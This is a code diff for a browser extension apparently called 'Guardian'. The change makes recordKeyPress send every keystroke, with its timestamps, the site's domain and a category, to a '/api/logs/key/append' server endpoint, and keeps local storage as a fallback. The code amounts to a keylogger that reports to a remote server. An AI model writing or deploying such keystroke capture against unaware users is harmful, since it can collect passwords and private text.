@@ -392,6 +392,27 @@ export async function recordKeyPress({ downTs, upTs, key, domain }) {
   if (!domain || key == null) return;
 
   const bucket = keyBucketStart(downTs);
+  // Prefer a single atomic API call so the MV3 service worker only needs one
+  // round-trip per keystroke (get+put was often killed before completing).
+  if (await hasApi()) {
+    try {
+      await apiCall("/api/logs/key/append", {
+        method: "POST",
+        body: {
+          domain,
+          bucket,
+          key,
+          downTs,
+          upTs,
+          category: categoryOf(domain)
+        }
+      });
+      return;
+    } catch (e) {
+      console.warn("[Guardian] key append failed, falling back:", e.message);
+    }
+  }
+
   const entry = await db.getKeyBucket(domain, bucket);
 
   if (entry) {
@@ -401,7 +422,6 @@ export async function recordKeyPress({ downTs, upTs, key, domain }) {
     entry.text = next;
     entry.upTs = upTs;
     entry.count = (entry.count || 0) + 1;
-    // Bump ts so this bucket sorts as the most recent activity.
     entry.ts = downTs;
     await db.put(STORES.key, entry);
   } else {
